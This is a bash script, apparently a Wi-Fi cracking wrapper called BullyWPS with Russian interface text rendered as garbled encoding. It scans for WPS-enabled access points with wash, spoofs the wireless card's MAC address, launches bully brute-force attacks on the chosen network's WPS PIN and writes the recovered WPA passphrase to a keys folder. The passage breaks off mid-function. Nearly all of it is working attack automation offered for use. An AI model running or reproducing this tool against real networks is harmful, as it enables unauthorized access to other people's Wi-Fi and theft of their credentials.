#!/bin/bash 


# Global Variables
SCRIPT="BullyWPS"
VERSION="2.1"
KEYS="$HOME/$SCRIPT/KEYS"
TMP="/tmp/$SCRIPT"
WPSPIN="pinWPS" 


# Check if the interface is connected to internet
CheckETH() {
clear
if [ "$(ip route|grep default)" != "" ]; then
  ETH=$(ip route|awk '/default/ {print $5}')
  HW_WIFI=$(ifconfig $WIFI|awk '/HW/ {print $5}'|cut -d- -f1,2,3,4,5,6)
  HW_ETH=$(ifconfig $ETH|awk '/HW/ {print $5}'|tr ':' '-')
  if [ "$HW_ETH" = "$HW_WIFI" ];then
    echo
    echo "[0;31m–ß—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å –æ—à–∏–±–æ–∫ –Ω–∞ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–µ \"$ETH\" —É–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –æ—Ç–∫–ª—é—á–µ–Ω—ã –æ—Ç –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞! [0m"
    echo ""
    echo "–ù–∞–∂–º–∏—Ç–µ enter –¥–ª—è –≤–æ–∑–≤—Ä–∞—Ç–∞ –≤ –º–µ–Ω—é."
    read junk
    menu
  fi
fi
}

# Function to select the target to attack
SeleccionarObjetivo() {
i=0
redesWPS=0
while read BSSID Channel RSSI WPSVersion WPSLocked ESSID;do
  longueur=${#BSSID}
  if [ $longueur -eq 17 ] ; then
    i=$(($i+1))
    WPSbssid[$i]=$BSSID
    WPSchanel[$i]=$Channel
    WPSessid[$i]=$ESSID
    PWR[$i]=$RSSI
  fi
  redesWPS=$i
done < $TMP/wash_capture.$$
if  [ "$redesWPS" = "0" ];then
  clear
  echo ""
  echo ""
  echo "                        * * *     –í –ù –ò –ú –ê –ù –ò –ï   * * *                "
  echo ""
  echo "                          Not found any RED "
  echo "                          –í–∫–ª—é—á–µ–Ω –∑–∞—Ö–≤–∞—Ç WPS"
  echo ""
  echo "                          [1;33m–ù–∞–∂–º–∏—Ç–µ ENTER –¥–ª—è –≤–æ–∑–≤—Ä–∞—Ç–∞ –≤ –º–µ–Ω—é!"
  read junk
  menu
else
  clear
  echo ""
  echo "                [1;32m–¢–æ—á–∫–∏ –¥–æ—Å—Ç—É–ø–∞ —É—è–∑–≤–∏–º—ã–µ –¥–ª—è –∞—Ç–∞–∫–∏ —Å BullyWPS[0m"
  echo ""
  echo "            MAC            SUPPORTED?      PWR      –ö–∞–Ω–∞–ª        ESSID"
  echo ""
  countWPS=0
  while [ 1 -le $i ]; do
    countWPS=$(($countWPS+1))
    ESSID=${WPSessid[$countWPS]}
    BSSID=${WPSbssid[$countWPS]}
    PWR=${PWR[$countWPS]}
    Chanel=${WPSchanel[$countWPS]}
    echo " $countWPS)  $BSSID         $SOPORTADA          $PWR         $Chanel         $ESSID"
    i=$(($i-1))
  done   
  i=$redesWPS
  echo ""
  echo " 0)  –í–æ–∑–≤—Ä–∞—Ç –≤ –º–µ–Ω—é " 
  echo ""
  echo ""
  echo " --> [1;36mSelect a network[0m"
  read WPSoption
  set -- ${WPSoption}

  if [ $WPSoption -le $redesWPS ]; then
    if [ "$WPSoption" = "0" ];then
      menu
    fi
    ESSID=${WPSessid[$WPSoption]}
    BSSID=${WPSbssid[$WPSoption]}
    CHANEL=${WPSchanel[$WPSoption]}
    clear
  else
    echo " –í—ã–±–æ—Ä –Ω–µ –≤–µ—Ä–µ–Ω ... –≤—ã–±–µ—Ä–∏—Ç–µ –∑–∞–Ω–æ–≤–æ"
    sleep 2
    SeleccionarObjetivo
  fi
fi
ShowWPA="OFF"
InfoAP="ON"
menu
}

# –ò—â–µ–º WPS —Å–µ—Ç–∏ —Å –ø–æ–º–æ—â—å—é Wash
WashScan() {
if [ "$WIFI" = "" ]; then auto_select_monitor && WashScan; fi
CheckETH
xterm -icon -e wash -i $WIFI -C -o $TMP/wash_capture.$$ & 
WashPID=$!
sec_rem=30 
sleep 30 && kill $WashPID &>/dev/null &
while true; do
let sec_rem=$sec_rem-1
        interval=$sec_rem
        seconds=`expr $interval % 60`
        interval=`expr $interval - $seconds`
  sleep 1
  clear
  echo "[1;33m–ò—â–µ–º —Ü–µ–ª–∏... [1;36m$seconds[0m [1;33mseconds[0m"
  echo ""
  cat $TMP/wash_capture.$$
  if [ ! -e /proc/$WashPID ]; then
    sleep 1
    break
  fi
done
SeleccionarObjetivo
}

auto_select_monitor() {
#! /bin/bash

#–ü–µ—Ä–µ–≤–æ–¥–∏–º –∫–∞—Ä—Ç—É –≤ —Ä–µ–∂–∏–º monitor mode –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏

clear
t=0
if [ "$WIFI" = "" ]; then
> $TEMP/wireless.txt
cards=`airmon-ng|cut -d ' ' -f 1 | awk {'print $1'} |grep -v Interface #|grep -v  mon   `
echo $cards >> $TEMP/wireless.txt
tarj1=`cat $TEMP/wireless.txt | cut -d  ' ' -f 1  | awk  '{print $1}'`
tarj2=`cat $TEMP/wireless.txt | cut -d  ' ' -f 2  | awk  '{print $1}'`
rm  -rf $TEMP/wireless.txt

if  [ "$tarj1" = "" ]; then
clear
echo "                  * * *     –í –ù –ò –ú –ê –ù –ò –ï   * * *                "
echo ""
echo "    –ù–µ –Ω–∞–π–¥–µ–Ω–Ω–æ –Ω–∏ –æ–¥–Ω–æ–π WiFi –∫–∞—Ä—Ç–æ—á–∫–∏ –Ω–∞ —ç—Ç–æ–º –∫–æ–º–ø—å—é—Ç–µ—Ä–µ"
echo ""
echo "    –ù–∞–∂–º–∏—Ç–µ ENTER –¥–ª—è –≤–æ–∑–≤—Ä–∞—Ç–∞ –≤ –º–µ–Ω—é"
read yn
menu
fi

if [ "$tarj1" = "$tarj2" ]; then
tarj2=""
fi

tarjselec=$tarj1

if [ "$tarj2" != "" ] ;then
echo
echo
echo "      –°–ª–µ–¥—É—é—â–∏–µ WiFi –∫–∞—Ä—Ç—ã –Ω–∞–π–¥–µ–Ω–Ω—ã –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–µ"
echo

airmon-ng |awk 'BEGIN { print "–ö–∞—Ä—Ç–∞  –ß–∏–ø              –î—Ä–∞–π–≤–µ—Ä\n------- ------------------ ----------" } \
  { printf "%-8s %-8s %-1s %10s\n", $1, $2, $3, $4 | "sort -r"}' |grep -v Interface  |grep -v Chipset

echo "      –í—ã–±–µ—Ä–∏—Ç–µ –æ–¥–Ω—É –∏–∑ –∫–∞—Ä—Ç"
echo

tarj_wire=""
tarjselec=""
function selectarj {
select tarjselec in `airmon-ng | awk {'print $1 | "sort -r"'} |grep -v Interface |grep -v Chipset  `; do
break;
done

if [ "$tarjselec" = "" ]; then
echo "  –í—ã–±—Ä–∞–Ω–Ω—ã–µ –æ–ø—Ü–∏–∏ –Ω–µ–≤–µ—Ä–Ω—ã."
echo "  –í—ã–±–µ—Ä–∏—Ç–µ –≤–µ—Ä–Ω—ã–µ –æ–ø—Ü–∏–∏..."
selectarj
fi
}

if [ "$tarjselec" = "" ]; then
selectarj
fi

echo ""
echo "–í—ã–±—Ä–∞–Ω–Ω—ã–π –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å: $tarjselec"

fi
else
echo 
fi
tarjmonitor=${tarjselec:0:3}
if [ "$tarjmonitor" != "mon" ] && [ "$WIFI" = "" ];then
echo ""
echo ""
echo "                    –ü–µ—Ä–µ–≤–æ–¥–∏–º –∫–∞—Ä—Ç—É –≤ —Ä–µ–∂–∏–º monitor mode..."
echo "" 
sleep 1

#clean interface

ifconfig $tarjselec down >/dev/null
ifconfig $tarjselec up >/dev/null
        ifconfig $tarjselec down
        ifconfig $tarjselec hw ether 00:11:22:33:44:55
        ifconfig $tarjselec up

airmon-ng start $tarjselec >/dev/null
cards=`airmon-ng|cut -d ' ' -f 1 |awk {'print $1 | "sort -d"'} |grep -v Interface |grep -v wlan`
largo=${#cards}
final=$(($largo-4))
WIFI=${cards:final}
echo  " $WIFI ----> Monitor mode –≤–∫–ª—é—á–µ–Ω."
sleep 2

else 
if [ "$WIFI" = "" ];then
WIFI="$tarjselec"

echo "" 
echo  " $WIFI ----> Monitor mode —É–∂–µ –≤–∫–ª—é—á–µ–Ω."
sleep 2
fi
fi
clear

# Spoof Mac Address and put card into monitor mode
echo -e "–•–æ—Ç–∏—Ç–µ —Å–º–µ–Ω–∏—Ç—å MAC –∞–¥—Ä–µ—Å –≤–∞—à–µ–π WiFi –∫–∞—Ä—Ç—ã? y/n"
 
read b
if [[ $b == "Y" || $b == "y" || $b = "" ]]; then
        wmac=00:11:22:33:44:55
        echo
        ifconfig $WIFI down
        macchanger -m 00:11:22:33:44:55 $WIFI
        ifconfig $WIFI up
        echo
        echo
        sleep 3
        else
echo "    –ù–∞–∂–º–∏—Ç–µ enter –¥–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è."
read c
if [[ $c == "N" || $c == "n" || $c = "" ]]; then
        ifconfig $tarjselec down
        macchanger -p $tarjselec
        ifconfig $tarjselec up
        tput setaf 1; echo "–ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å –±–µ–∑ —Å–º–µ–Ω—ã MAC"
        echo
        echo
        echo
        sleep 2
fi
fi
}  

function ObtenerWPA_con_pin_o_no {
read -p "–í–≤–µ—Å—Ç–∏ PIN –≤—Ä—É—á–Ω—É—é? Y/n :" x y

if [[ $x == "Y" || $x == "y" || $x = "" ]]; then
 read -p "pinWPS: " XWPSPIN
 echo ""
 echo ""
 echo ""
xterm -hold -geometry 65x30-1-1 -e bully $WIFI -b $BSSID -c $CHANEL -e $ESSID -p $XWPSPIN -F -B -l 100 -v 3 &
 bullyPID=$!
# If "Control + C" is pressed, the process stops Bully
trap 'kill $BULLY_PID >/dev/null 2>&1' SIGINT
while true; do
  sleep 1
  clear
echo "[+] –ê—Ç–∞–∫—É–µ–º " $BSSID---$ESSID " –Ω–∞ –∫–∞–Ω–∞–ª–µ " $CHANEL " —É–¥–∞—á–Ω–æ–≥–æ –≤–∑–ª–æ–º–∞!"
  echo "[1;33m–ü–æ–ª—É—á–∞–µ–º WPA...[0m"
  echo ""
  if [ ! -e /proc/$bullyPID ]; then
    sleep 2
    break
  fi
done
echo ""
if [ "$(tail -n 2 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|grep "signal 0$")" ]; then
             PIN="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $2}')"
CLAVE_WPA="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $4}')"
if [ "$WPA_KEY" = "" ]; then
  WPA_TXT="$(echo $ESSID)_$(echo $BSSID|tr ':' '-').txt"
  echo "ESSID: $ESSID" >  $TMP/$WPA_TXT
  echo "PIN WPS: $PIN" >> $TMP/$WPA_TXT
  echo "CLAVE WPA: $CLAVE_WPA" >> $TMP/$WPA_TXT
  cat $TMP/$WPA_TXT|sed -e 's/$/\r/' > $KEYS/$WPA_TXT
  ShowWPA="ON"
  echo "[1;31m–ö–ª—é—á –±—ã–ª —Å–æ—Ö—Ä–∞–Ω–µ–Ω in \"$KEYS/$WPA_TXT\"[0m"
fi
fi
clear
echo "" 
echo "" 
echo "" 
wait
else
echo "    –ù–∞–∂–º–∏—Ç–µ enter –¥–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è."
if [[ $y == "N" || $y == "n" || $y = "" ]]; then
read y
# Attack the Access point
 
xterm -hold -geometry 65x30-1-1 -e bully $WIFI -b $BSSID -c $CHANEL -e $ESSID -F -l 100 -v 3 &
bullyPID=$!
# If "Control + C" is pressed, the process stops bully
trap 'kill $BULLY_PID >/dev/null 2>&1' SIGINT
while true; do
  sleep 1
  clear
echo "[+] –ê—Ç–∞–∫—É–µ–º " $BSSID---$ESSID " –Ω–∞ –∫–∞–Ω–∞–ª–µ " $CHANEL " —É–¥–∞—á–Ω–æ–≥–æ –≤–∑–ª–æ–º–∞!"
  echo "[1;33m–ü–æ–ª—É—á–∞–µ–º WPA...[0m"
  echo ""
  if [ ! -e /proc/$bullyPID ]; then
    sleep 2
    break
  fi
done
echo ""
if [ "$(tail -n 2 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|grep "signal 0$")" ]; then
             PIN="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $2}')"
CLAVE_WPA="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $4}')"
if [ "$WPA_KEY" = "" ]; then
  WPA_TXT="$(echo $ESSID)_$(echo $BSSID|tr ':' '-').txt"
  echo "ESSID: $ESSID" >  $TMP/$WPA_TXT
  echo "PIN WPS: $PIN" >> $TMP/$WPA_TXT
  echo "CLAVE WPA: $CLAVE_WPA" >> $TMP/$WPA_TXT
  cat $TMP/$WPA_TXT|sed -e 's/$/\r/' > $KEYS/$WPA_TXT
  ShowWPA="ON"
  echo "[1;31m–ö–ª—é—á –±—ã–ª —Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ \"$KEYS/$WPA_TXT\"[0m"
echo "" 
sleep 3
echo ""
echo "    –ù–∞–∂–º–∏—Ç–µ enter –¥–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è."
read junk
menu
fi
fi
fi
fi
}

function ObtenerWPA {
read -p "–í–≤–µ—Å—Ç–∏ PIN –≤—Ä—É—á–Ω—É—é? Y/n :" y

if [[ $y == "Y" || $y == "y" || $y = "" ]]; then
read -p "pinWPS: " yWPSPIN
 echo ""
 echo ""
 echo ""
xterm -hold -geometry 65x30-1-1 -e bully $WIFI -b $BSSID -c $CHANEL -e $ESSID -p $yWPSPIN -F -B -v 3 &
bullyPID=$!
# If "Control + C" is pressed, the process stops bully
trap 'kill $BULLY_PID >/dev/null 2>&1' SIGINT
while true; do
  sleep 1
  clear
echo "[+] –ê—Ç–∞–∫—É–µ–º " $BSSID---$ESSID " –Ω–∞ –∫–∞–Ω–∞–ª–µ " $CHANEL " —É–¥–∞—á–Ω–æ–≥–æ –≤–∑–ª–æ–º–∞!"
  echo "[1;33m–ü–æ–ª—É—á–∞–µ–º WPA...[0m"
  echo ""
  if [ ! -e /proc/$bullyPID ]; then
    sleep 2
    break
  fi
done
echo ""
if [ "$(tail -n 2 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|grep "signal 0$")" ]; then
             PIN="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $2}')"
CLAVE_WPA="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $4}')"
if [ "$WPA_KEY" = "" ]; then
  WPA_TXT="$(echo $ESSID)_$(echo $BSSID|tr ':' '-').txt"
  echo "ESSID: $ESSID" >  $TMP/$WPA_TXT
  echo "PIN WPS: $PIN" >> $TMP/$WPA_TXT
  echo "CLAVE WPA: $CLAVE_WPA" >> $TMP/$WPA_TXT
  cat $TMP/$WPA_TXT|sed -e 's/$/\r/' > $KEYS/$WPA_TXT
  ShowWPA="ON"
  echo "[1;31m–ö–ª—é—á –±—ã–ª —Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ \"$KEYS/$WPA_TXT\"[0m"
fi
fi
clear
echo "" 
echo "" 
echo "" 
wait
else
echo "    –ù–∞–∂–º–∏—Ç–µ Enter –¥–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è."
if [[ $e == "N" || $e == "n" || $e = "" ]]; then
read e
# Attack the Access point
 
xterm -hold -geometry 65x30-1-1 -e bully $WIFI -b $BSSID -c $CHANEL -e $ESSID --force -B -v 3 &
 bullyPID=$!
# If "Control + C" is pressed, the process stops bully
trap 'kill $BULLY_PID >/dev/null 2>&1' SIGINT
while true; do
  sleep 1
  clear
echo "[+] –ê—Ç–∞–∫—É–µ–º " $BSSID---$ESSID " –Ω–∞ –∫–∞–Ω–∞–ª–µ " $CHANEL " —É–¥–∞—á–Ω–æ–≥–æ –≤–∑–ª–æ–º–∞!"
  echo "[1;33m–ü–æ–ª—É—á–∞–µ–º WPA...[0m"
  echo ""
  if [ ! -e /proc/$bullyPID ]; then
    sleep 2
    break
  fi
done
echo ""
if [ "$(tail -n 2 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|grep "signal 0$")" ]; then
             PIN="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $2}')"
CLAVE_WPA="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $4}')"
if [ "$WPA_KEY" = "" ]; then
  WPA_TXT="$(echo $ESSID)_$(echo $BSSID|tr ':' '-').txt"
  echo "ESSID: $ESSID" >  $TMP/$WPA_TXT
  echo "PIN WPS: $PIN" >> $TMP/$WPA_TXT
  echo "CLAVE WPA: $CLAVE_WPA" >> $TMP/$WPA_TXT
  cat $TMP/$WPA_TXT|sed -e 's/$/\r/' > $KEYS/$WPA_TXT
  ShowWPA="ON"
  echo "[1;31m–ö–ª—é—á –±—ã–ª —Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ \"$KEYS/$WPA_TXT\"[0m"
sleep 3
echo ""
echo "–ù–∞–∂–º–∏—Ç–µ enter –¥–ª—è –≤–æ–∑–≤—Ä–∞—Ç–∞ –≤ –º–µ–Ω—é"
read junk
menu
fi
fi
fi
fi
}

function Primer_pin {
read -p "Y–í–≤–µ—Å—Ç–∏ PIN –≤—Ä—É—á–Ω—É—é? Y/n :" d

if [[ $d == "Y" || $d == "y" || $d = "" ]]; then
read -p "pinWPS: " dWPSPIN
 echo ""
 echo ""
 echo ""
CheckETH
xterm -hold -geometry 65x30-1-1 -e bully  $WIFI -b $BSSID -c $CHANEL -e $ESSID -p $dWPSPIN -F -B -v 3  & 
bullyPID=$!
# If "Control + C" is pressed, the process stops bully
trap 'kill $BULLY_PID >/dev/null 2>&1' SIGINT
while true; do
  sleep 1
  clear
echo "[+] –ê—Ç–∞–∫—É–µ–º " $BSSID---$ESSID " –Ω–∞ –∫–∞–Ω–∞–ª–µ " $CHANEL " —É–¥–∞—á–Ω–æ–≥–æ –≤–∑–ª–æ–º–∞!"
  echo "[1;33m–ü–æ–ª—É—á–∞–µ–º WPA...[0m"
  echo ""
  if [ ! -e /proc/$bullyPID ]; then
    sleep 2
    break
  fi
done
echo ""
if [ "$(tail -n 2 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|grep "signal 0$")" ]; then
             PIN="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $2}')"
CLAVE_WPA="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $4}')"
if [ "$WPA_KEY" = "" ]; then
  WPA_TXT="$(echo $ESSID)_$(echo $BSSID|tr ':' '-').txt"
  echo "ESSID: $ESSID" >  $TMP/$WPA_TXT
  echo "PIN WPS: $PIN" >> $TMP/$WPA_TXT
  echo "–ö–ª—é—á WPA: $CLAVE_WPA" >> $TMP/$WPA_TXT
  cat $TMP/$WPA_TXT|sed -e 's/$/\r/' > $KEYS/$WPA_TXT
  ShowWPA="ON"
  echo "[1;31m–ö–ª—é—á –±—ã–ª —Å–æ—Ö—Ä–∞–Ω–µ–Ω in \"$KEYS/$WPA_TXT\"[0m"
sleep 3
echo ""
echo "    –ù–∞–∂–º–∏—Ç–µ enter –¥–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è."
read junk
menu
fi
fi
fi
}

#Functional Bully Commands
function optional_functions {
#Set optional functions
bully #to show the options available in terminal
echo "[+] bully $WIFI -b $BSSID -c $CHANEL -e $ESSID"
echo "[+] Enter other functions bully to attack with ex-A-C-D, etc. with spaces"
read bullyVars
#Start
xterm -hold -geometry 65x30-1-1 -e bully $WIFI -b $BSSID -c $CHANEL -e $ESSID $bullyVars & 
bullyPID=$!
# If "Control + C" is pressed, the process stops bully
trap 'kill $BULLY_PID >/dev/null 2>&1' SIGINT
while true; do
  sleep 1
  clear
echo "[+] Starting bully (bully $WIFI -b $BSSID -c $CHANEL -e $ESSID $bullyVars)"
echo "[+] Attacking " $BSSID---$ESSID "on channel " $CHANEL " Good Luck and Happy Hacking"
  echo "[1;33m–ü–æ–ª—É—á–∞–µ–º WPA...[0m"
  echo ""
  if [ ! -e /proc/$bullyPID ]; then
    sleep 2
    break
  fi
done
echo ""
if [ "$(tail -n 2 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|grep "signal 0$")" ]; then
             PIN="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $2}')"
CLAVE_WPA="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $4}')"
if [ "$WPA_KEY" = "" ]; then
  WPA_TXT="$(echo $ESSID)_$(echo $BSSID|tr ':' '-').txt"
  echo "ESSID: $ESSID" >  $TMP/$WPA_TXT
  echo "PIN WPS: $PIN" >> $TMP/$WPA_TXT
  echo "Key WPA: $CLAVE_WPA" >> $TMP/$WPA_TXT
  cat $TMP/$WPA_TXT|sed -e 's/$/\r/' > $KEYS/$WPA_TXT
  ShowWPA="ON"
  echo "[1;31m–ö–ª—é—á –±—ã–ª —Å–æ—Ö—Ä–∞–Ω–µ–Ω in \"$KEYS/$WPA_TXT\"[0m"
sleep 3
echo ""
echo ""
echo "–ù–∞–∂–º–∏—Ç–µ enter –¥–ª—è –≤–æ–∑–≤—Ä–∞—Ç–∞ –≤ –º–µ–Ω—é."
read junk
menu
fi
fi
}

#Function update Bully
function bully_update {
echo "   "
echo "          [1;32m–≠—Ç–æ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π —É—Å—Ç–∞–Ω–æ–≤—â–∏–∫ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–π –¥–ª—è bully[0m"
echo ""
echo "        [1;36m[–ù–µ–æ–±—Ö–æ–¥–∏–º –∏–Ω—Ç–µ—Ä–Ω–µ—Ç –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è –ø–∞–∫–µ—Ç–æ–≤ bully][0m"
echo ""
sleep 1
echo "–ü—Ä–æ—Ü–µ–¥—É—Ä–∞ —Å–∫–∞—á–∏–≤–∞–Ω–∏—è –ø–æ—Å–ª–µ–¥–Ω–µ–π –≤–µ—Ä—Å–∏–∏."
sleep 3

# Download the latest Revision with svn
cd /tmp
echo "[1;32m"
svn co http://bully.googlecode.com/svn/trunk/src/ /tmp/bully-read-only && \
echo [0m
cd /tmp/bully-read-only
clear
sleep 2

# Version identification
if [ ! -d ".svn/" ]
then
	echo "0"
	exit ;
fi

REVISION="`svnversion 2> /dev/null | sed 's/[^0-9]*//g'`"

if [ x$REVISION = "x" ]
then
	REVISION="`svn info 2> /dev/null | grep -i revision | sed
's/[^0-9]*//g'`"
fi

if [ x$REVISION = "x" ]
then
	if [ -f ".svn/entries" ]
	then
		REVISION="`cat .svn/entries | grep -i revision | head -n 1 | sed
's/[^0-9]*//g'`"
	fi
fi

if [ x$REVISION = "x" ]
then
	REVISION="-1"
fi

# We report the version
echo ""
echo ""
echo "                      [1;33m<<[0m –í–µ—Ä—Å–∏—è –ø–∞–∫–µ—Ç–∞-[1;32m$REVISION
[1;33m>>[0m"
sleep 3

# Compile
echo ""
echo ""
echo "[1;33mSe –ü—Ä–æ—Ü–µ–¥—É—Ä–∞ –∫–æ–º–ø–ª–∏—Ä–æ–≤–∞–Ω–∏—è –ø–∞–∫–µ—Ç–æ–≤ ..."
sleep 3
echo "[1;36m"
make  && \
echo "[0m"
clear
sleep 3

# Installed in system
echo ""
echo ""
echo "[1;35m–ü—Ä–æ—Ü–µ–¥—É—Ä–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –ø–∞–∫–µ—Ç–æ–≤ –≤ —Å–∏—Å—Ç–µ–º—É..."
sleep 3
echo ""
echo "[1;33m"
make install && \
echo "[0m"
clear
sleep 3


# Limpiamos
echo ""
echo ""
echo "[1;36m–ß–∏—â—É –≤—Ä–µ–º–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã.."
echo ""
sleep 3
rm -Rf /tmp/bully-read-only/trunk/src/ &> /dev/null
rm -Rf $DESTDIR &> /dev/null
sleep 2

# We report the completion of the process
echo ""
echo ""
echo "[1;33m–í—Å–µ –∑–∞–¥–∞—á–∏ –±—ã–ª–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–Ω—ã! "
echo ""
echo ""
sleep 3
wait

# Press ENTER to return to menu

echo ""
echo "–ù–∞–∂–º–∏—Ç–µ enter –¥–ª—è –≤–æ–∑–≤—Ä–∞—Ç–∞ –≤ –º–µ–Ω—é."
read yn
menu
}
#Function update macchanger
function macchanger_update {
echo "   "
echo "          [1;32m–≠—Ç–æ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π —É—Å—Ç–∞–Ω–æ–≤—â–∏–∫ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–π –¥–ª—è macchanger[0m"
echo ""
echo "        [1;36m[–ù–µ–æ–±—Ö–æ–¥–∏–º –∏–Ω—Ç–µ—Ä–Ω–µ—Ç –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è –ø–∞–∫–µ—Ç–æ–≤ macchanger][0m"
echo ""
sleep 1
echo "–ü—Ä–æ—Ü–µ–¥—É—Ä–∞ —Å–∫–∞—á–∏–≤–∞–Ω–∏—è –ø–æ—Å–ª–µ–¥–Ω–µ–π –≤–µ—Ä—Å–∏–∏. "
sleep 3

# Download the latest Revision with svn
cd /tmp
echo "[1;32m"
git clone http://github.com/alobbs/macchanger/ /tmp/macchanger && \
echo [0m
cd /tmp/macchanger
clear
sleep 2
# Cmpile
echo ""
echo ""
echo "[1;33mSe –ü—Ä–æ—Ü–µ–¥—É—Ä–∞ –∫–æ–º–ø–ª–∏—Ä–æ–≤–∞–Ω–∏—è –ø–∞–∫–µ—Ç–æ–≤ ..."
sleep 3
echo "[1;36m"
bash autogen.sh
echo "[0m"
sleep 3
make  && \
echo "[0m"
clear
sleep 3

# Installed in system
echo ""
echo ""
echo "[1;35m–ü—Ä–æ—Ü–µ–¥—É—Ä–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –ø–∞–∫–µ—Ç–æ–≤ –≤ —Å–∏—Å—Ç–µ–º—É..."
sleep 3
echo ""
echo "[1;33m"
make install && \
echo "[0m"
clear
sleep 3


# Clean
echo ""
echo ""
echo "[1;36m–ß–∏—â—É –≤—Ä–µ–º–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã.."
echo ""
sleep 3
rm -Rf /tmp/macchanger/ &> /dev/null
sleep 2

# We report the completion of the process
echo ""
echo ""
echo "[1;33m–í—Å–µ –ø—Ä–æ—Ü–µ—Å—Å—ã –±—ã–ª–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–Ω—ã! "
echo ""
echo ""
sleep 3
wait

# Press ENTER to return to menu

echo ""
    echo "–ù–∞–∂–º–∏—Ç–µ enter –¥–ª—è –≤–æ–∑–≤—Ä–∞—Ç–∞ –≤ –º–µ–Ω—é."
read yn
menu
}

#Function card unmount and exit
function DESMONTAR_tarj_y_salir {
if [ "$WIFI" != "" ]; then
clear
echo ""
  echo ""
  echo ""
  echo "	[1;33m####################################################################"
  echo "	[1;33m###                                                              ###"
  echo "	[1;33m###     ¬ø –ò–∑–≤–ª–µ—á—å –∫–∞—Ä—Ç—É –ø–æ—Å–ª–µ –≤—ã—Ö–æ–¥–∞?                            ###"
  echo "	[1;33m###                                                              ###"
  echo "	[1;33m###        (n) –ù–µ—Ç  -> –í—ã–π—Ç–∏ –±–µ–∑ –∏–∑–≤–ª–µ—á–µ–Ω–∏—è                      ###"
  echo "	[1;33m###        (m) –ú–µ–Ω—é -> –û–±—Ä–∞—Ç–Ω–æ –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é                    ###"
  echo "	[1;33m###        ENTER    -> –ò–∑–≤–ª–µ—á—å –∏ –≤—ã–π—Ç–∏                           ###"
  echo "	[1;33m###       (r)+ENTER -> –í–æ—Å—Å—Ç–∞–Ω–æ–≤–∏—Ç –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π MAC              ###"
  echo "	[1;33m###                                                              ###"
  echo "	[1;33m####################################################################"
  echo ""
  echo ""
read salida
set -- ${salida}

if [ "$salida" = "r" ]; then
ifconfig $tarjselec down
macchanger -p $tarjselec
ifconfig $tarjselec up
fi
if [ "$salida" = "m" ]; then
menu
fi
if [ "$salida" = "n" ]; then
  echo ""
echo "         –ñ–¥–∏—Ç–µ."
sleep 2
clear 
exit
fi
